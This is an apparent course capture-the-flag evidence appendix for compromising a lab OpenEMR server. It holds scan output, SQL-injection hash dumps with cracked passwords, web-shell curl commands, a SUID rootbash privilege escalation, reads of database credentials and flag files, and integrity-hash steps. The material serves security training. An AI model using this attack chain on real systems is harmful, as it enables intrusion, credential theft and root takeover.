# Evidence Appendix
## CIP-A105 | CTF2 | Operation Black Forge

---

## A1 — Scan Evidence

### A1.1 nmap Full TCP Scan Output
File: 01_scans/nmap_full_tcp_phase1.txt

PORT STATE SERVICE VERSION
21/tcp open ftp ProFTPD 1.3.3d
80/tcp open http Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
MAC Address: 00:0C:29:41:80:4C (VMware)
Service Info: OS: Unix


### A1.2 gobuster Large Wordlist Output (key findings)
File: 01_scans/gobuster_root_big_phase2.txt

/openemr (Status: 301) [--> http://192.168.254.128/openemr/]
/phpMyAdmin (Status: 403)
/gitweb (Status: 301)
/server-status (Status: 403)
/server-info (Status: 403)


### A1.3 searchsploit Output
File: 01_scans/searchsploit_openemr_phase3.txt

Key entries:

OpenEMR 4.1.0 - 'u' SQL Injection | php/webapps/49742.py
OpenEMR 4.1.1 Patch 14 - Multiple | php/webapps/28329.txt


---

## A2 — Credential Evidence

### A2.1 Extracted Hashes
File: 04_evidence_hashes/openemr_hashes.txt

3863efef9ee2bfbc51ecdca359c6302bed1389e8
ab24aed5a7c4ad45615cd7e0da816eea39e4895d


MD5 integrity check:
```bash
md5sum 04_evidence_hashes/openemr_hashes.txt
```

### A2.2 Cracked Credentials
File: 04_evidence_hashes/openemr_cracked_creds.txt
username	hash	plaintext	type
admin	3863efef9ee2bfbc51ecdca359c6302bed1389e8	ackbar	SHA1
medical	ab24aed5a7c4ad45615cd7e0da816eea39e4895d	medical	SHA1

### A2.3 john Crack Output

medical (?)
ackbar (?)
2g 0:00:00:00 DONE (2026-09-19 23:37) 6.250g/s 3238Kp/s


---

## A3 — Exploitation Evidence

### A3.1 SQL Injection Execution Output

[+] Finding number of users...
[+] Found number of users: 2
[+] Extracting username and password hash...
admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d


### A3.2 Authentication Confirmation

HTTP/1.1 200 OK
Server: Apache/2.2.17
X-Powered-By: PHP/5.3.3

(admin session, pre-hashed authPass submission)

### A3.3 File Upload Confirmation

HTTP/1.1 200 OK
...

<option value='bindshell2.php'>bindshell2.php</option> ... Edit File in /var/www/html/openemr/sites/default ````
A3.4 RCE Confirmation
Command: curl -s "http://192.168.254.128/openemr/sites/default/images/shell.php?cmd=id"
Output: (not captured separately — confirmed via bind shell id command below)

Command: curl -s "http://192.168.254.128/openemr/sites/default/images/shell.php?cmd=uname+-a"
Output: Linux localhost.localdomain 2.6.38.8-pclos3.bfs #1 SMP PREEMPT Fri Jul 8 18:01:30 CDT 2011 i686
A4 — Post-Exploitation Evidence
A4.1 Shell Context
id
uid=479(apache) gid=416(apache) groups=416(apache)

whoami
apache

hostname
localhost.localdomain
A4.2 SUID Binary Discovery
Command: find / -perm -4000 -type f 2>/dev/null
Key result: /usr/bin/healthcheck

ls -la /usr/bin/healthcheck
-rwsr-sr-x 1 root root 5813 Jul 29 2020 /usr/bin/healthcheck
A4.3 strings Analysis of healthcheck
strings /usr/bin/healthcheck (key output):
setuid
system
setgid
clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
A4.4 Database Credentials in Config
cat /var/www/html/openemr/sites/default/sqlconf.php
$host   = 'localhost';
$login  = 'openemr';
$pass   = 'openemr';
$dbase  = 'openemr';
A5 — Privilege Escalation Evidence
A5.1 rootbash Creation Confirmation
ls -la /tmp/rootbash
-rwsrwxrwx 1 root root 864208 Sep 19 17:23 /tmp/rootbash
A5.2 Root Access Confirmation
/tmp/rootbash -p -c 'id'
uid=479(apache) gid=416(apache) euid=0(root) groups=0(root),416(apache)
A6 — Mission Proof
A6.1 User Flag
/tmp/rootbash -p -c 'cat /home/almirant/user.txt'
d41d8cd98f00b204e9800998ecf8427e
A6.2 Root Flag
/tmp/rootbash -p -c 'cat /root/root.txt'
(ASCII art banner)
root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b
A7 — Evidence File Hashes

Run the following to generate integrity hashes for all key evidence files:

bash
md5sum ~/CIP-A105_RegNo_CTF2_Black-Forge/04_evidence_hashes/openemr_hashes.txt
md5sum ~/CIP-A105_RegNo_CTF2_Black-Forge/04_evidence_hashes/openemr_cracked_creds.txt
md5sum ~/CIP-A105_RegNo_CTF2_Black-Forge/01_scans/nmap_full_tcp_phase1.txt
md5sum ~/CIP-A105_RegNo_CTF2_Black-Forge/01_scans/gobuster_root_big_phase2.txt
md5sum ~/CIP-A105_RegNo_CTF2_Black-Forge/01_scans/searchsploit_openemr_phase3.txt

Save output to:

bash
md5sum ~/CIP-A105_RegNo_CTF2_Black-Forge/04_evidence_hashes/*.txt \
       ~/CIP-A105_RegNo_CTF2_Black-Forge/01_scans/*.txt \
  > ~/CIP-A105_RegNo_CTF2_Black-Forge/04_evidence_hashes/evidence_integrity_hashes.txt
echo "Integrity hashes saved"

